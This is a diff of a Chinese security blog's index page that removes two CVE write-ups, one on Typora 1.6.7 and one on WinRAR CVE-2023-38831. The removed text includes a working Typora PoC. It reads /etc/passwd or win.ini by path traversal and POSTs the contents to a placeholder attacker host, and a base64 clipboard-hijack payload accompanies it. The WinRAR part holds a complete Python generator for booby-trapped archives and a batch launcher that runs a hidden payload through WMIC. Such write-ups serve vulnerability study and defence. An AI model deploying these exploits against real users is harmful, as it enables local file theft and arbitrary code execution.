-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><h4 id="利用方式1，打开恶意markdown文件"><a href="#利用方式1，打开恶意markdown文件" class="headerlink" title="利用方式1，打开恶意markdown文件"></a>利用方式1，打开恶意markdown文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Typora 1.6.7 Local File Disclosure Proof-of-Concept&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre id=&quot;log&quot; style=&quot;background: #eee; width: 100%;&quot;&gt;&lt;/pre&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const log = t =&gt; &#123;</span><br><span class="line">        document.getElementById(&quot;log&quot;).textContent += t + &#x27;\r\n&#x27;;</span><br><span class="line">        fetch(&#x27;//example.localtest.me/send-file-to-attacker-server&#x27;, &#123;mode: &#x27;no-cors&#x27;, body: t, method: &#x27;POST&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    log(&#x27;location.origin: &#x27; + location.origin)</span><br><span class="line">    log(&#x27;navigator.platform: &#x27; + navigator.platform)</span><br><span class="line">    log(&#x27; &#x27;)</span><br><span class="line">    if(navigator.platform === &#x27;Win32&#x27;)&#123;</span><br><span class="line">        log(&#x27;Content of your C:\\Windows\\win.ini:&#x27;)</span><br><span class="line">        fetch(&#x27;typora://app/typemark/%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#x27;).then(r=&gt;r.text()).then(r=&gt;&#123;log(r)&#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        log(&#x27;Content of your /etc/passwd:&#x27;)</span><br><span class="line">        fetch(&#x27;typora://app/typemark#/../../../../../../../../etc/passwd&#x27;).then(r=&gt;r.text()).then(r=&gt;&#123;log(r)&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>将上面的HTML文件另存为 <code>poc1.html</code> 并将其存放到Web服务器，然后将此行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;http(s)://YOUR-WEB-SERVER/poc1.html&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>附加到任何markdown文件中。</p>
-<p>在poc执行后，</p>
-<ol>
-<li>尝试在Windows或 <code>/etc/passwd</code> Linux上阅读 <code>C:/Windows/win.ini</code> ，</li>
-<li>在网页中显示文件的内容，</li>
-<li>将文件发送到外部 URL <code>example.localtest.me</code> （此域解析为 127.0.0.1 仅用于演示目的）。</li>
-</ol>
-<h4 id="利用方式2-编辑网页上的copy事件"><a href="#利用方式2-编辑网页上的copy事件" class="headerlink" title="利用方式2 编辑网页上的copy事件"></a>利用方式2 编辑网页上的copy事件</h4><p> 攻击者可以手工创建恶意网页，并使用以下代码挂接 <code>copy</code> 事件： </p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;copy&#x27;</span>,<span class="function"><span class="params">e</span>=&gt;</span>&#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="comment">//&amp;#x3c;embed style=&quot;height:0;&quot; src=&quot;https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html&quot;&gt;&amp;#x0d;&amp;#x0d;</span></span><br><span class="line">        <span class="keyword">let</span> payload = <span class="title function_">atob</span>(<span class="string">&#x27;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJodHRwczovL28uY2FsMS5jbi9jYWIzZTcyMzU0MGQ5OTQ4LXR5cG9yYS0xNjctcG9jL2xvY2FsLWZpbGUtZGlzY2xvc3VyZS5odG1sIj4mI3gwZDsmI3gwZDs=&#x27;</span>);</span><br><span class="line">        e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/markhtml&#x27;</span>, <span class="string">`\x20\x0d\x0a\x0d\x0a`</span> + payload + <span class="variable language_">window</span>.<span class="title function_">getSelection</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(payload + <span class="variable language_">window</span>.<span class="title function_">getSelection</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p> 当受害者从此页面复制文本时，有效负载将添加到复制的内容中，并在粘贴到 Typora 时触发。 </p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;embed style=&quot;height:0;&quot; src=&quot;https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>相当于在Typora中内嵌了上面的内容</p>
-<p><img src="/categories/CTF/CVE-2023-2317/CVE-2023-2971_03.Copy-and-Paste.gif" alt></p>
-<h3 id="2971漏洞原理"><a href="#2971漏洞原理" class="headerlink" title="2971漏洞原理"></a>2971漏洞原理</h3><blockquote>
-<p>为了在Typora编辑器中加载本地资源，在 <code>resources/app.asar/atom.js</code>, 自定义了URL模式<code>typora://</code>，通过<code>electron.protocol.registerFileProtocol</code> API注册.  </p>
-<p>处理 <code>typora://</code>的代码片段如下 : </p>
-</blockquote>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">m.<span class="title function_">registerFileProtocol</span>(e, <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    e.<span class="property">url</span> ? <span class="title function_">t</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: c.<span class="title function_">getRealPath</span>(e.<span class="property">url</span>)</span><br><span class="line">    &#125;) : <span class="title function_">t</span>(&#123;</span><br><span class="line">        <span class="attr">error</span>: -<span class="number">324</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;),</span><br><span class="line"></span><br><span class="line">c.<span class="property">getRealPath</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        e = <span class="built_in">decodeURI</span>(e)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    e = e.<span class="title function_">substr</span>(<span class="number">13</span>);<span class="comment">//截取到模式选项</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^userData/i</span>.<span class="title function_">exec</span>(e))</span><br><span class="line">        e = e.<span class="title function_">replace</span>(<span class="regexp">/^userData/</span>, c.<span class="title function_">getPath</span>(<span class="string">&quot;userData&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^typemark/i</span>.<span class="title function_">exec</span>(e))      <span class="comment">// [1]</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;reject access to path&quot;</span>, e),</span><br><span class="line">            <span class="string">&quot;&quot;</span>;</span><br><span class="line">        e = e.<span class="title function_">replace</span>(<span class="regexp">/^typemark/</span>, t)       <span class="comment">// [2]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/current-theme\.css$/</span>.<span class="title function_">exec</span>(e) &amp;&amp; (e = e.<span class="title function_">replace</span>(<span class="regexp">/current-theme\.css$/</span>, c.<span class="property">setting</span>.<span class="title function_">curTheme</span>())),</span><br><span class="line">    e = (e = <span class="regexp">/preview\.html/</span>.<span class="title function_">exec</span>(e) ? e.<span class="title function_">replace</span>(<span class="regexp">/\.html[?#].*$/</span>, <span class="string">&quot;.html&quot;</span>) : e).<span class="title function_">replace</span>(<span class="regexp">/[?#][^\\\/]*$/</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 例如，当主窗口尝试加载 <code>typora://app/typemark/window.html</code> 时，URL 将从 转换 <code>[Typora Installation Absolute Path]/resources/window.html</code> 和加载。 </p>
-<h2 id="漏洞缓解和漏洞建议"><a href="#漏洞缓解和漏洞建议" class="headerlink" title="漏洞缓解和漏洞建议"></a>漏洞缓解和漏洞建议</h2><p> 对于使用受此漏洞影响的版本的最终用户，建议 （1） 不应在 Typora 中打开任何不受信任的 markdown 文件，以及 （2） 应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。 </p>
-<p> 禁止 http 网页访问 <code>typora://</code> 资源。 如在浏览器和Typora0.9版本中规定的那样。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2023-38831/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/CVE-2023-38831/" class="post-title-link" itemprop="url">CVE-2023-38831 Winrar文件扩展欺骗</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-27 14:19:49" itemprop="dateCreated datePublished" datetime="2023-08-27T14:19:49+08:00">2023-08-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-30 15:07:21" itemprop="dateModified" datetime="2023-08-30T15:07:21+08:00">2023-08-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> WinRAR 在处理压缩包内同名的文件与文件夹时存在代码执行漏洞。攻击者构建由恶意文件与非恶意文件构成的特制压缩包文件，诱导受害者打开此文件中看似无害的文件（如JPG文件）后，将在受害者机器上执行任意代码。目前此漏洞存在在野利用。</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>ShellExecute 函数接收到打开文件的错误参数。图片的文件名不符合搜索条件，导致被跳过。最终Winrar发现并执行批处理文件，而不是查找预期的图片。 </p>
-<p>影响版本：WinRAR &lt;6.23 </p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>实际测试了多个winrar版本：下载链接：<a target="_blank" rel="noopener" href="https://winrar.en.uptodown.com/windows/versions">https://winrar.en.uptodown.com/windows/versions</a></p>
-<p>1.电脑上安装Winrar6.22</p>
-<p>2.生成poc.zip或者poc.rar文件，默认用winrar打开，测试了发现bat和dos脚本可以成功执行，而vbs无法执行。</p>
-<p>3.打开zip，双击jpg文件，此时目录下的脚本被执行。</p>
-<p><img src="/categories/CTF/CVE-2023-38831/1693376871430.png" alt="1693376871430"></p>
-<p><a target="_blank" rel="noopener" href="https://www.winrar.com.cn/download/winrar-x64-611scp.exe">611下载</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.rarlab.com/rar/winrar-x64-623sc.exe">官网623下载地址</a></p>
-<p><img src="/categories/CTF/CVE-2023-38831/1693370508867.png" alt="1693370508867"></p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/Garck3h/cve-2023-38831">Go版本的</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line">import shutil</span><br><span class="line"></span><br><span class="line">TempFile = &quot;result&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;cve-2023-38831.py by Garck3h,modified by Paul\n&quot;)</span><br><span class="line">    args = os.sys.argv[1:]  # Get command-line arguments</span><br><span class="line">    argLen = len(args)</span><br><span class="line"></span><br><span class="line">    if argLen &gt; 2:</span><br><span class="line">        TypeFile = os.path.basename(args[0])  # Extract file type</span><br><span class="line">        Payload = os.path.basename(args[1])   # Extract payload file</span><br><span class="line">        file_extension = os.path.splitext(Payload)[1]</span><br><span class="line">        OuputFile = os.path.basename(args[2])  # Extract output file</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Usage:\n    python cve-2023-38831.py &lt;TypeFile&gt; &lt;Payload&gt; &lt;OuputFile&gt;&quot;)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print(&quot;TypeFile:&quot;, TypeFile)</span><br><span class="line">    print(&quot;Payload:&quot;, Payload)</span><br><span class="line">    print(&quot;OuputFile:&quot;, OuputFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        os.mkdir(TempFile)  # Create temporary directory</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    d = os.path.join(TempFile, TypeFile + &quot;A&quot;)</span><br><span class="line">    try:</span><br><span class="line">        os.mkdir(d, 0o755)  # Create subdirectory under temporary directory</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        shutil.copy(Payload, os.path.join(d, TypeFile + &quot;A&quot;+file_extension))  # Copy payload file to TypeFileA.cmd</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        shutil.copy(TypeFile, os.path.join(TempFile, TypeFile + &quot;B&quot;))  # Copy file type file to TypeFileB</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        zip_directory(TempFile)  # Zip the temporary directory</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        with open(TempFile + &quot;.zip&quot;, &quot;rb&quot;) as file:</span><br><span class="line">            file_content = file.read()  # Read the compressed file content</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    bait_ext = &quot;.&quot; + TypeFile.split(&quot;.&quot;)[1]  # Extract file extension</span><br><span class="line">    file_content = bytes_replace(file_content, bait_ext.encode() + b&quot;A&quot;, bait_ext.encode() + b&quot; &quot;)  # Replace &quot;TypeFileA&quot; with &quot;TypeFile &quot;</span><br><span class="line">    file_content = bytes_replace(file_content, bait_ext.encode() + b&quot;B&quot;, bait_ext.encode() + b&quot; &quot;)  # Replace &quot;TypeFileB&quot; with &quot;TypeFile &quot;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        os.remove(TempFile + &quot;.zip&quot;)  # Delete temporary zip file</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(&quot;Changing suffix..&quot;)</span><br><span class="line">        with open(OuputFile, &quot;wb&quot;) as file:</span><br><span class="line">            file.write(file_content)  # Write modified content to output file</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line">    try:</span><br><span class="line">        shutil.rmtree(TempFile)  # Delete temporary directory</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        os.sys.exit(1)</span><br><span class="line">    print(&quot;Generation completed&quot;)</span><br><span class="line"></span><br><span class="line">def copy_file(src, dst):</span><br><span class="line">    with open(src, &quot;rb&quot;) as in_file, open(dst, &quot;wb&quot;) as out_file:</span><br><span class="line">        out_file.write(in_file.read())</span><br><span class="line"></span><br><span class="line">def zip_directory(dir_name):</span><br><span class="line">    with zipfile.ZipFile(TempFile + &quot;.zip&quot;, &quot;w&quot;, zipfile.ZIP_DEFLATED) as zip_file:</span><br><span class="line">        for root, _, files in os.walk(dir_name):</span><br><span class="line">            for file in files:</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                arcname = os.path.relpath(file_path, dir_name)</span><br><span class="line">                zip_file.write(file_path, arcname=arcname)</span><br><span class="line"></span><br><span class="line">def bytes_replace(source, old, new):</span><br><span class="line">    return source.replace(old, new)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>自解压缩包 (Self-extracting archive)</p>
-<p> 一个 <strong>Cabinet Self-extractor file</strong> (袖珍自我提取文件)，通常称为 SFX CAB 文件 </p>
-<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>记录一个dos命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if not DEFINED IS_MINIMIZED (</span><br><span class="line">  set IS_MINIMIZED=1</span><br><span class="line">  start &quot;&quot; /min &quot;%~dpnx0&quot; %*</span><br><span class="line">  exit</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cd %TEMP%</span><br><span class="line"></span><br><span class="line">for /F &quot;delims=&quot; %%K in (&#x27;dir /b /s &quot;Screenshot_05-04-2023.jpg&quot;&#x27;) do (</span><br><span class="line">  for /F &quot;delims=&quot; %%G in (&#x27;dir /b /s &quot;Images.ico&quot;&#x27;) do (</span><br><span class="line">    WMIC process call create &quot;%%~G&quot;</span><br><span class="line">    &quot;%%~K&quot;</span><br><span class="line">    cd %CD%</span><br><span class="line">    exit</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1152,7 +1023,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-count">165</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1261,6 +1132,61 @@
   
 
   
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
